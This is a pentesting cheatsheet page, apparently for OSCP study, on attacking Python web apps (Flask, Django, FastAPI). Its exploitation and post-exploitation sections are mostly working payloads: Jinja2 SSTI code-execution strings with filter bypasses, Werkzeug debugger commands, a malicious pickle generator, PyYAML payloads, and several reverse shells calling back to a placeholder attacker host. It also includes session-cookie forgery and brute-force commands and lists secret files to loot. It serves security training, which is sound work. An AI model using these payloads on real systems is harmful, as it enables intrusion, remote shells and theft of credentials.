# Python

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Framework-specific](#5-framework-specific)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `Server: gunicorn` | Flask / Django / FastAPI (WSGI/ASGI) |
| `Server: uvicorn` | FastAPI / Starlette |
| `Server: Werkzeug/2.2.2 Python/3.10.6` | Flask dev server (version visible) |
| `X-Powered-By: Flask` | Flask |
| `Set-Cookie: session=...` | Flask (signed cookie) |
| `Set-Cookie: csrftoken=...; sessionid=...` | Django |
| `Set-Cookie: session=.eJw...` | Flask (JWT-like, base64) |
| `Server: TwistedWeb` | Twisted |

### 1.2 Error messages

| Error text | Framework |
|------------|-----------|
| `Werkzeug Debugger` | Flask debug mode (interactive console!) |
| `Traceback (most recent call last):` | Any Python |
| `django.core.exceptions` | Django |
| `jinja2.exceptions` | Jinja2 (Flask, generic) |
| `pydantic.error_wrappers` | FastAPI |
| `sqlalchemy.exc` | SQLAlchemy |

### 1.3 File extensions and paths

- `.py`, `.pyc`, `.pyo`, `.pyd`
- `/__pycache__/` - bytecode cache
- `/static/`, `/templates/` - Django/Flask structure
- `/requirements.txt`, `/Pipfile`, `/pyproject.toml`

---

## 2. Enumeration

### 2.1 Common files

| Path | Purpose |
|------|---------|
| `/requirements.txt` | Dependency list with versions |
| `/Pipfile.lock` | Exact versions |
| `/pyproject.toml` | Poetry / PEP 518 |
| `/settings.py` | Django settings (SECRET_KEY, DB creds) |
| `/.env` | DB creds, API keys |
| `/app.py`, `/main.py`, `/wsgi.py` | Entry points |
| `/debug.log` | Flask/Django logs |

### 2.2 Werkzeug debugger (critical)

If `Server: Werkzeug` and any error triggers a page with `Werkzeug Debugger` - you have an **interactive Python console** in the browser.

```bash
# Confirm debug mode
curl -s http://<TARGET>/nonexistent | grep -i "Werkzeug Debugger"
```

> [!IMPORTANT]
> OSCP report: take a screenshot of the Werkzeug debugger page (command + output + timestamp).
> This is a direct RCE primitive.

### 2.3 Jinja2 SSTI probe

```bash
# Math test
curl "http://<TARGET>/?name={{7*7}}"
# Response: 49 -> Jinja2 SSTI confirmed
```

### 2.4 Flask session cookie decode

```bash
# flask-unsign
pip3 install flask-unsign
flask-unsign --decode --cookie "eyJ1c2VyIjoiYWRtaW4ifQ.Y..."
flask-unsign --unsign --cookie "<cookie>" --wordlist /usr/share/wordlists/rockyou.txt
```

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2019-14322 | Django < 2.2.4 | SQL injection via `FilteredSelectMultiple` | https://nvd.nist.gov/vuln/detail/CVE-2019-14322 |
| CVE-2021-45115 | Django 2.2-4.0 | DoS in `UserAttributeSimilarityValidator` | https://nvd.nist.gov/vuln/detail/CVE-2021-45115 |
| CVE-2021-33026 | Flask-Session < 0.3.0 | Pickle deserialization in cookie | https://nvd.nist.gov/vuln/detail/CVE-2021-33026 |
| CVE-2019-10906 | Jinja2 < 2.10.1 | `str.format_map` sandbox escape | https://nvd.nist.gov/vuln/detail/CVE-2019-10906 |
| CVE-2024-34064 | Jinja2 < 3.1.4 | XML attribute injection | https://nvd.nist.gov/vuln/detail/CVE-2024-34064 |
| CVE-2022-24856 | FastAPI < 0.65.2 | DoS via malformed request | https://nvd.nist.gov/vuln/detail/CVE-2022-24856 |

---

## 4. Exploitation patterns

### 4.1 SSTI in Jinja2 (Flask)

**Detection:**

```text
{{7*7}}      -> 49
{{7*'7'}}    -> 7777777
${7*7}       -> literal (not Jinja2)
```

**RCE via Jinja2:**

```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

**Full RCE shell (Jinja2):**

```text
{{ config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"').read() }}
```

**Bypass tricks:**

| Filter | Bypass |
|--------|--------|
| `{{ }}` blocked | Use `{% ... %}` or `.` |
| `.__` blocked | Use `['__class__']`, `attr` filter: `\|attr('__class__')` |
| `_` blocked | Use `\x5f` (hex escape) |
| `config` blocked | Use `self`, `request`, `lipsum` |

**Full payload list:** see PayloadsAllTheThings / Server Side Template Injection.

### 4.2 Werkzeug debugger RCE

If `Werkzeug Debugger` page is visible:

1. Trigger an exception (e.g. `/nonexistent`, `?x=`).
2. In the traceback, click the console icon next to any frame.
3. Enter the PIN (see below) or use the console directly if PIN is disabled.

**PIN bypass** (if you have file read / can compute the PIN):

The PIN is derived from `username`, `modname`, `getattr(app, 'name')`, `app.root_path`, `uuid.getnode()` (MAC address), and `get_machine_id()` (from `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`).

Generator: `werkzeug-debug-pin` or manual computation.

**Direct RCE if PIN is known / debugger unlocked:**

```python
import os; os.popen('id').read()
__import__('os').system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"')
```

### 4.3 Deserialization (pickle)

Python `pickle` on user input = RCE. Common sinks:

```python
pickle.loads(request.cookies.get('session'))
pickle.load(open(user_file, 'rb'))
```

**Generate malicious pickle:**

```bash
python3 -c "
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"
```

### 4.4 YAML deserialization

```python
yaml.load(user_input)  # RCE in PyYAML < 5.1
```

Payload:

```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
```

Note: `yaml.safe_load` is safe. Only `yaml.load` without `Loader=SafeLoader` is vulnerable.

### 4.5 Command injection

Common sinks:

```python
os.system(cmd)
os.popen(cmd)
subprocess.run(cmd, shell=True)
subprocess.Popen(cmd, shell=True)
eval(input)
exec(input)
```

`shell=True` \+ user input = command injection. Even with list args, `subprocess.run(['ls', user_input])` is unsafe if shell chars are not filtered.

### 4.6 SQL injection (raw SQL)

```python
cursor.execute(f"SELECT * FROM users WHERE name='{name}'")  # vulnerable
cursor.execute("SELECT * FROM users WHERE name=%s", (name,))  # safe
```

Django ORM: `.raw()`, `.extra()` with user input = vulnerable.

### 4.7 Flask session cookie forgery

If `SECRET_KEY` leaks (from `settings.py`, `.env`, `config.py`), forge a session:

```bash
flask-unsign --sign --cookie "{'user':'admin','role':'admin'}" --secret '<SECRET_KEY>'
```

Brute force the key:

```bash
flask-unsign --unsign --cookie "<cookie>" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

---

## 5. Framework-specific

### 5.1 Flask

- `app.py` - main file
- `templates/` - Jinja2 templates
- `static/` - static files
- `/console` - Werkzeug console (if debug)
- `SECRET_KEY` in `app.config`

### 5.2 Django

- `settings.py` - SECRET_KEY, DATABASES, ALLOWED_HOSTS
- `urls.py` - routes
- `views.py` - controllers
- `/admin/` - admin panel (default creds often)
- `DEBUG = True` - verbose errors

### 5.3 FastAPI

- `main.py` - entry point
- `/docs`, `/redoc` - auto-generated API docs (Swagger, ReDoc)
- `/openapi.json` - schema
- Pydantic validation errors reveal field names

### 5.4 uvicorn / gunicorn

- `Server: uvicorn` - ASGI (FastAPI, Starlette)
- `Server: gunicorn` - WSGI (Flask, Django)

---

## 6. Post-exploitation

### 6.1 Read config files

```text
/app/settings.py
/app/config.py
/app/.env
/app/app.py
/var/www/app/settings.py
```

Look for: `SECRET_KEY`, `DATABASE_URL`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`.

### 6.2 Django admin credentials

`/admin/` with default creds (admin/admin, admin/password) or from `settings.py`.

### 6.3 Python reverse shell

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<LHOST>",<LPORT>))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

One-liner:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the framework fingerprint (Server header, error page) that identifies Python.

> [!IMPORTANT]
> OSCP report: screenshot SSTI detection ({{7*7}} -> 49) and the RCE payload output.

> [!IMPORTANT]
> OSCP report: screenshot the moment of RCE (Werkzeug console, SSTI shell, pickle payload).

---

## 8. References

- Python official docs: https://docs.python.org/3/
- HackTricks - Python: https://book.hacktricks.xyz/pentesting-web/deserialization
- PayloadsAllTheThings - SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- PayloadsAllTheThings - Python: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Python%20Serialization
- flask-unsign: https://github.com/Paradoxis/Flask-Unsign
- CVE-2019-14322: https://nvd.nist.gov/vuln/detail/CVE-2019-14322
- CVE-2021-45115: https://nvd.nist.gov/vuln/detail/CVE-2021-45115
- CVE-2021-33026: https://nvd.nist.gov/vuln/detail/CVE-2021-33026
- CVE-2019-10906: https://nvd.nist.gov/vuln/detail/CVE-2019-10906
- CVE-2024-34064: https://nvd.nist.gov/vuln/detail/CVE-2024-34064
- CVE-2022-24856: https://nvd.nist.gov/vuln/detail/CVE-2022-24856

---